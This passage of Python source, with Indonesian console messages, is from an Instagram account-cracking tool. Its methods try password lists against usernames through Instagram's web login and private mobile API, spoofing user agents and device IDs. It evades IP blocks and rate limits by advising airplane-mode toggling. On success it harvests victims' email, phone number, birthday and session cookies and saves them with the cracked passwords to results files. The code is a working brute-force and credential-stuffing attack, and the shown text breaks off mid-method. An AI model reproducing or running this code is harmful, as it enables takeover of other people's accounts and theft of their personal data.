                            Console().print(f"[bold royal_blue1]   ──>[bold red] TERJADI KESALAHAN TAK TERDUGA![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Kata sandi yang Anda masukkan salah.' in str(response.text.replace('\\', '')):
                            Bad += 1
                            continue
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping}[bold royal_blue1]/[bold white]{Bad} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_THREADS_2023(total, username, password, encrypt_password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def MAIN_AJAX(self, total, username, password, force_authentication_url, encrypt_password):
        global Checkpoint, Sukses, Looping, Bad
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.persen = Looping * 100 / len(total)
                    with requests.Session() as r:
                        self.useragent = Generate_Useragent().Android_Useragent()
                        r.headers.update({
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-user': '?1',
                            'sec-fetch-dest': 'document',
                            'accept-encoding': 'gzip, deflate',
                            'connection': 'keep-alive',
                            'upgrade-insecure-requests': '1',
                            'sec-fetch-site': 'none',
                            'Host': 'www.instagram.com',
                            'user-agent': self.useragent,
                        })
                        response = r.get('https://www.instagram.com/accounts/login/?force_authentication=1&enable_fb_login=1&next=%2Foauth%2Fauthorize%3Fclient_id%3D200289238967899%26redirect_uri%3Dhttps%3A%2F%2Fauth.meta.com%2Flogin%2Finstagram%2Fresponse%2F%3Fstate%3DATBtBE3dsaFZPaUUhCncK0Fn8iehKluf2GLHpfUc4SBumiZQTJpV7FOz-BTflVYHu5ue2_9mNoIUDGKKp02irb2XAEQNpBMTDKVZUSbJoblGmWXTLyyU1ao8vihVwntPWCU4XCcVBAPYxMH6Z5MpcZRCBNlAhtpeaShRaYzKDHE_NxeZ2u88B_K8Xu66NZuL5FV4EzcgxD9NcWmDMYQ1H857Q2qB5DX5Y7EkKm0YY5rThn6h1AAn8ybm5Um3YtLacBPupd_ukR0GcC_qEA%26response_type%3Dcode%26scope%3Duser_profile%26state%3DATBtBE3dsaFZPaUUhCncK0Fn8iehKluf2GLHpfUc4SBumiZQTJpV7FOz-BTflVYHu5ue2_9mNoIUDGKKp02irb2XAEQNpBMTDKVZUSbJoblGmWXTLyyU1ao8vihVwntPWCU4XCcVBAPYxMH6Z5MpcZRCBNlAhtpeaShRaYzKDHE_NxeZ2u88B_K8Xu66NZuL5FV4EzcgxD9NcWmDMYQ1H857Q2qB5DX5Y7EkKm0YY5rThn6h1AAn8ybm5Um3YtLacBPupd_ukR0GcC_qEA%26logger_id%3D44aa677d-f350-47d8-afa8-594aa5bd9d52').text
                        try:
                            self.find_enc_pass = re.search('{"key_id":"(\d+)","public_key":"(.*?)","version":"(\d+)"}', str(response).replace('\\', ''))
                            self.key_id, self.public_key, self.version = self.find_enc_pass.group(1), self.find_enc_pass.group(2), self.find_enc_pass.group(3)
                            self.csrftoken = re.search('"csrf_token":"(.*?)"', str(response).replace('\\', '')).group(1)
                            self.ig_did = re.search('{"_js_ig_did":{"value":"(.*?)"', str(response).replace('\\', '')).group(1)
                            self.datr = re.search('"_js_datr":{"value":"(.*?)"', str(response).replace('\\', '')).group(1)
                            self.x_instagram_ajax = re.search('"rollout_hash":"(.*?)"', str(response).replace('\\', '')).group(1)
                            self.query_Params = re.search('"params":.*?"next":"(.*?)",', str(response).replace('\\', '')).group(1)
                        except (AttributeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] ATTRIBUTE ERROR![bold white]", end='\r')
                            time.sleep(5.6)
                            continue
                        if encrypt_password == '1' or encrypt_password == '01':
                            self.enc_password = self.Encrypt_Password(int(self.key_id), self.public_key, pws, int(self.version))
                        else:
                            self.enc_password = (f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pws}')
                        data = {
                            'enc_password': self.enc_password,
                            'username': username,
                            'queryParams': '{"force_authentication":"1","enable_fb_login":"1","next":"' + str(self.query_Params) + '"}',
                            'optIntoOneTap': True,
                            'trustedDeviceRecords': {},
                        }
                        r.headers.pop('upgrade-insecure-requests')
                        r.headers.pop('sec-fetch-user')
                        r.headers.update({
                            'x-ig-app-id': '936619743392459',
                            'x-asbd-id': '198387',
                            'referer': force_authentication_url,
                            'x-instagram-ajax': self.x_instagram_ajax,
                            'sec-fetch-dest': 'empty',
                            'cookie': f'dpr=1.5; csrftoken={self.csrftoken}; ig_did={self.ig_did}; ig_nrcb=1; datr={self.datr}',
                            'x-csrftoken': self.csrftoken,
                            'accept-encoding': 'gzip, deflate, br',
                            'x-ig-www-claim': '0',
                            'accept': '*/*',
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                            'sec-fetch-mode': 'cors',
                            'origin': 'https://www.instagram.com',
                            'sec-ch-ua-mobile': '?0',
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-requested-with': 'XMLHttpRequest',
                            'x-web-device-id': self.ig_did,
                            'sec-fetch-site': 'same-origin',
                        })
                        response2 = r.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = data, allow_redirects = True)
                        #open('Response.txt','a').write(f'{username}|{pws}|{self.enc_password}|{self.useragent}|{response2.text}\n')
                        if 'userId' in str(response2.text) or 'sessionid' in r.cookies.get_dict().keys():
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                self.cookies = Convert().Cookies(r.cookies.get_dict())
                                self.nomor, self.email, self.birthday = Dapatkan().Akun_Sukses(self.cookies)
                                self.bergabung = Dapatkan().Get_Joined(self.cookies)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            if '#PWD_INSTAGRAM_BROWSER:10:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style="bold royal_blue1", width=67))
                            else:
                                tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel(f"[bold green]{self.bergabung}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.birthday}", style="bold royal_blue1", width=33)]))
                            #tree.add(Panel(f"[bold green]{self.Useragent_String(self.useragent)}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel(f"[bold green]{self.email}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.nomor}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies}')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies};\n')
                            break
                        elif '/challenge/action/' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                self.cookies = Convert().Cookies(r.cookies.get_dict())
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            #tree.add(Panel(f"[bold red]{self.Useragent_String(self.useragent)}", style="bold royal_blue1", width=67))
                            if '#PWD_INSTAGRAM_BROWSER:10:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style="bold royal_blue1", width=67))
                            else:
                                tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'ip_block' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'generic_request_error' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif len(response2.text) == 0 or 'Oops, an error occurred.' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response2.text) or 'Harap tunggu beberapa' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Page Not Found' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] COOKIES DISABLED IN YOUR BROWSER![bold white]", end='\r')
                            time.sleep(0.5)
                            continue
                        elif 'https://www.instagram.com/challenge/' in str(response2.text):
                            Bad += 1
                            continue
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping}[bold royal_blue1]/[bold white]{Bad} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_AJAX(total, username, password, force_authentication_url, encrypt_password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def MAIN_API_2019(self, total, username, password):
        global Checkpoint, Sukses, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    with requests.Session() as r:
                        self.useragent = Generate_Useragent().Instagram_Useragent().split('Safari/537.36')[1].replace(' InstagramLite 3.0.0.7.78', 'Instagram 103.1.0.15.119').replace('in_ID; 117883409)', 'in_ID; 164094530)')
                        self.persen = Looping * 100 / len(total)
                        self._hash = hashlib.md5()
                        self._hash.update(username.encode('utf-8') + pws.encode('utf-8'))
                        self.hex_ = self._hash.hexdigest()

                        self.volatile_seed = ('12345')
                        self._hash.update(self.hex_.encode('utf-8') + self.volatile_seed.encode('utf-8'))
                        self.device_id = str(uuid.uuid4())
                        data = {
                            'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{"id":"' + str(self.device_id) + '","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_custom_transitions_universe,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_session_scoped_logger,ig_android_accoun_switch_badge_fix_universe,ig_android_smartlock_hints_universe,ig_android_black_out,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_android_direct_remove_view_mode_stickiness_universe,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"}',
                            'ig_sig_key_version': '4',
                        }
                        r.headers.update({
                            'x-pigeon-session-id': str(uuid.uuid4()),
                            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                            'x-ig-connection-speed': '-1kbps',
                            'x-ig-bandwidth-speed-kbps': '-1.000',
                            'x-ig-bandwidth-totalbytes-b': '0',
                            'x-device-id': self.device_id,
                            'x-ig-bandwidth-totaltime-ms': '0',
                            'x-bloks-version-id': '14f543394cf83e14784db6457e197a7e61e34fcd161891682143f74cb69a8981',
                            'x-ig-connection-type': 'WIFI',
                            'x-ig-capabilities': '3brTvw==',
                            'x-ig-app-id': '567067343352427',
                            'user-agent': self.useragent,
                            'accept-language': 'id-ID, en-US',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'accept-encoding': 'gzip, deflate',
                            'host': 'i.instagram.com',
                            'x-fb-http-engine': 'Liger',
                            'connection': 'keep-alive',
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        })
                        response = r.post('https://i.instagram.com/api/v1/qe/sync/', data = data)
                        try:
                            self._csrftoken = r.cookies.get_dict()['csrftoken']
                        except (Exception):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] CSRF-TOKEN ERROR![bold white]", end='\r')
                            time.sleep(5.6)
                            continue
                        r.headers.update({
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        })
                        try:
                            data = (f'signed_body=f84427b576688f197712fff5073b51969528cd57c751eea5e3ecb69cfcfa0354\
                                    .%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(self._csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(self.device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(self._hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(pws))}%22%2C%22login_attempt_count%22%3A%222%22%7D&ig_sig_key_version=4')
                            response2 = r.post('https://i.instagram.com/api/v1/accounts/login/', data = data, allow_redirects = True)
                            #open('Response.txt','a').write(f'{username}|{pws}|{self.useragent}|{response2.text}\n')
                        except (UnicodeDecodeError, UnicodeEncodeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] CODEC CANNOT ENCODE CHARACTER![bold white]", end='\r')
                            time.sleep(2.5)
                            continue
                        if 'logged_in_user' in str(response2.text) or 'sessionid' in r.cookies.get_dict().keys():
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                self.cookies = Convert().Cookies(r.cookies.get_dict())
                                self.nomor, self.email, self.birthday = Dapatkan().Akun_Sukses(self.cookies)
                                self.bergabung = Dapatkan().Get_Joined(self.cookies)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel(f"[bold green]{self.bergabung}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.birthday}", style="bold royal_blue1", width=33)]))
                            tree.add(Columns([Panel(f"[bold green]{self.email}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.nomor}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.cookies};", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies}')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies};\n')
                            break
                        elif 'challenge_required' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                self.cookies = Convert().Cookies(r.cookies.get_dict())
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'https://instagram.com/web/unsupported_version/' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] VERSION APLIKASI INSTAGRAM TERBLOKIR![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'ip_block' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'generic_request_error' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif len(response2.text) == 0 or 'Oops, an error occurred.' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response2.text) or 'Harap tunggu beberapa' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_API_2019(total, username, password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def MAIN_API_2018(self, total, username, password):
        global Checkpoint, Sukses, Looping, Bad
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    with requests.Session() as r:
                        self.useragent = Generate_Useragent().Instagram_Useragent().split('Safari/537.36')[1].replace(' InstagramLite 3.0.0.7.78', 'Instagram 72.0.0.21.98').replace('in_ID; 117883409)', 'in_ID; 132081622)')
                        self.persen = Looping * 100 / len(total)
                        try:
                            self._hash = hashlib.md5()
                            self._hash.update(username.encode('utf-8') + pws.encode('utf-8'))

                            self.hex_ = self._hash.hexdigest()
                            self._hash.update(self.hex_.encode('utf-8') + '12345'.encode('utf-8'))
                            self.x_device_id = str(uuid.uuid4())
                            data = {
                                'signed_body': '538fb2330998e97a58863693212d6e4775d997328c5de7ea5dff621267aa940b.{"id":"' + str(self.x_device_id) + '","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_direct_inbox_account_switching,ig_android_autosubmit_password_recovery_universe,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_android_typeahead_subsequence_matching,ig_android_background_voice_phone_confirmation_prefilled_phone_number_only,ig_android_crosshare_feed_post,ig_android_realtime_manager_cleanup_universe,ig_client_logging_efficiency,ig_android_user_scoped_event_bus_universe,ig_android_direct_main_tab_universe,ig_android_aymh_signal_collecting_kill_switch,ig_android_login_forgot_password_universe,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_multi_tap_login_new,ig_android_email_one_tap_auto_login_during_reg,ig_android_report_nux_completed_device,ig_android_gms_registration_universe,ig_android_reg_login_profile_photo_universe,ig_android_caption_typeahead_fix_on_o_universe,ig_android_notification_processing_universe,ig_android_run_account_nux_on_server_cue_device,ig_android_nux_add_email_device,ig_android_one_tap_show_logged_out_only_user,ig_android_device_sms_retriever_plugin_universe,ig_android_remember_password_at_login,ig_type_ahead_recover_account,ig_android_analytics_accessibility_event,ig_android_updated_copy_user_lookup_failed,ig_sem_resurrection_logging,ig_android_abandoned_reg_flow,ig_android_editable_username_in_reg,ig_android_directapp_camera_open_and_reset_universe,ig_android_publisher_integration,ig_android_account_recovery_auto_login,ig_android_hide_fb_connect_for_signup,ig_android_sim_info_upload,ig_android_skip_signup_from_one_tap_if_no_fb_sso,ig_android_hide_fb_flow_in_add_account_flow,ig_account_recovery_via_whatsapp_universe,ig_android_targeted_one_tap_upsell_universe,ig_prioritize_user_input_on_switch_to_signup,ig_android_gmail_oauth_in_reg,ig_android_login_provider_migration,ig_android_stories_reel_interactive_tap_target_size,ig_android_reg_omnibox,ig_android_gmail_autocomplete_account_over_one_tap,ig_android_background_voice_phone_confirmation,ig_android_phone_auto_login_during_reg,ig_android_hide_typeahead_for_logged_users,ig_android_bundle_size_audit_universe,ig_android_icon_perf,ig_android_video_bug_report_universe,ig_android_hindi,ig_android_bottom_sheet,ig_android_show_password_in_reg_universe,ig_android_one_tap_fallback_auto_login,ig_android_device_verification_separate_endpoint,ig_account_recovery_with_code_android_universe,ig_android_onboarding_skip_fb_connect,ig_android_phone_reg_redesign_universe,ig_android_universe_noticiation_channels,ig_restore_focus_on_reg_textbox_universe,ig_android_onetaplogin_login_upsell,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_run_device_verification,ig_two_fac_login_screen,ig_android_reg_nux_headers_cleanup_universe,ig_android_contact_import_placement_universe,ig_android_dialog_email_reg_error_universe,ig_fb_invite_entry_points,ig_android_modularized_nux_universe_device,ig_android_device_verification_fb_signup,ig_android_suma_biz_account,ig_android_onetaplogin_optimization,ig_android_browser_service_job_intent_universe,ig_android_ask_for_permissions_on_reg,ig_challenge_kill_switch,ig_android_exoplayer_settings,ig_android_low_priority_notifications_universe,ig_android_security_intent_switchoff,ig_android_only_prefill_free_email_address_in_reg,ig_android_background_voice_confirmation_block_argentinian_numbers,ig_android_do_not_show_back_button_in_nux_user_list,ig_android_2fac_auto_fill_sms_universe,ig_android_passwordless_auth,ig_android_stories_reels_tray_media_count_check,ig_android_session_scoping_facebook_account,ig_android_email_suggestions_universe,ig_android_prefill_full_name_from_fb,ig_android_access_flow_prefill"}',
                                'ig_sig_key_version': '4',
                            }
                            r.headers.update({
                                'x-ig-bandwidth-totalbytes-b': '0',
                                'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                                'x-ig-bandwidth-totaltime-ms': '0',
                                'Host': 'b.i.instagram.com',
                                'accept-encoding': 'gzip, deflate',
                                'x-ig-capabilities': '3brTvw==',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'accept-language': 'id-ID, en-US',
                                'connection': 'keep-alive',
                                'x-ig-bandwidth-speed-kbps': '-1.000',
                                'x-ig-app-id': '567067343352427',
                                'x-fb-http-engine': 'Liger',
                                'x-device-id': self.x_device_id,
                                'x-ig-connection-speed': '-1kbps',
                                'user-agent': self.useragent,
                                'x-ig-connection-type': 'MOBILE(LTE)',
                            })
                            response = r.post('https://b.i.instagram.com/api/v1/qe/sync/', data = data)
                            try:
                                self.mid, self.csrftoken = response.cookies.get_dict()['mid'], response.cookies.get_dict()['csrftoken']
                            except (Exception):
                                Console().print("\r                                                                       ", end='\r')
